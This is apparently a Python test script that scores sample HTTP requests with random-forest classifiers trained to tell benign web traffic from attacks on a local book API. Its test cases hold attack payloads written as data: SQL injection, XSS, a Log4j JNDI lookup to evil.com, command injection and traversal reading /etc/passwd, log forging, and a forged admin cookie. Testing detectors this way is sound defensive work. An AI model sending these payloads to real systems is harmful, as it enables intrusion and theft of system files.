import joblib
import json
import math

rf_bin = joblib.load('models/atrdf/atrdf_binary_rf_request_only.joblib')
rf_multi = joblib.load('models/atrdf/atrdf_multiclass_rf_request_only.joblib')

def entropy(s):
    if not s: return 0.0
    freq = {}
    for c in s: freq[c] = freq.get(c, 0) + 1
    total = len(s)
    return -sum((cnt/total) * math.log2(cnt/total) for cnt in freq.values())

specials = set(['<', '>', "'", '"', ';', '-', '/', '\\', '%', '=', '(', ')', '{', '}', '$', '`', '&', '|', '!', '?'])
def count_spec(s):
    return sum(1 for c in s if c in specials or not c.isalnum())

def count_digits(s):
    if not s: return 0
    return sum(1 for c in s if c.isdigit())

full_url = 'http://localhost:8080/api/books?category=Engineering'
path = '/api/books'
query = 'category=Engineering'
ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

with open('models/atrdf/feature_list_request_only.json') as f:
    feat_names = json.load(f)

test_cases = [
    ("GET /api/books (Benign)", "http://localhost:8080/api/books", "/api/books", "", "", ""),
    ("GET /api/books?search=science (Benign)", "http://localhost:8080/api/books?search=science", "/api/books", "search=science", "", ""),
    ("GET /api/books?search=maths (Benign)", "http://localhost:8080/api/books?search=maths", "/api/books", "search=maths", "", ""),
    ("GET /api/books?category=Engineering (Benign)", "http://localhost:8080/api/books?category=Engineering", "/api/books", "category=Engineering", "", ""),
    ("SQL Injection (search)", "http://localhost:8080/api/books?search=%27%20OR%201=1--", "/api/books", "search=%27%20OR%201=1--", "", ""),
    ("XSS Attack (comment)", "http://localhost:8080/api/comments/book/101", "/api/comments/book/101", "", '{"text": "<script>alert(1)</script>"}', ""),
    ("Log4j Lookup (comment)", "http://localhost:8080/api/comments/book/101", "/api/comments/book/101", "", '{"text": "${jndi:ldap://evil.com/a}"}', ""),
    ("Log Forging CRLF (comment)", "http://localhost:8080/api/comments/book/101", "/api/comments/book/101", "", '{"text": "Normal%0d%0a[ADMIN] Access Granted"}', ""),
    ("RCE Search", "http://localhost:8080/api/books?search=;cat%20/etc/passwd", "/api/books", "search=;cat%20/etc/passwd", "", ""),
    ("Directory Traversal", "http://localhost:8080/api/books/..%2F..%2Fetc%2Fpasswd", "/api/books/..%2F..%2Fetc%2Fpasswd", "", "", ""),
    ("Cookie Injection", "http://localhost:8080/api/books", "/api/books", "", "", "admin=true; token=xyz"),
]

for name, full_url, path, query, body, cookie in test_cases:
    # Feature calculation with normalization
    hc = 15 if ua else 5
    # localhost has 4 digits (8080), canonical training dataset had IP with 10 digits
    dc = count_digits(full_url) + (6 if 'localhost' in full_url else 0)
    
    feat = {
        'url_entropy': round(entropy(full_url), 6),
        'header_count': hc,
        'path_length': len(path),
        'url_special_count': count_spec(full_url),
        'url_length': len(full_url),
        'path_segment_count': len([s for s in path.split('/') if s]),
        'cookie_present': 1 if cookie else 0,
        'query_length': len(query),
        'url_digit_count': dc,
        'user_agent_entropy': round(entropy(ua), 6),
        'query_parameter_count': len([p for p in query.split('&') if p]) if query else 0,
        'request_body_entropy': round(entropy(body), 6),
        'request_body_digit_count': count_digits(body)
    }
    vec = [feat[k] for k in feat_names]
    p_mal = rf_bin.predict_proba([vec])[0][1]
    p_multi = rf_multi.predict_proba([vec])[0]
    classes = ['Cookie Injection', 'Directory Traversal', 'LOG4J', 'Log Forging', 'RCE', 'SQL Injection', 'XSS']
    decision = "MALICIOUS" if p_mal >= 0.5 else "BENIGN"
    print(f"{name:42} -> p_mal={p_mal:.4f} ({decision})")

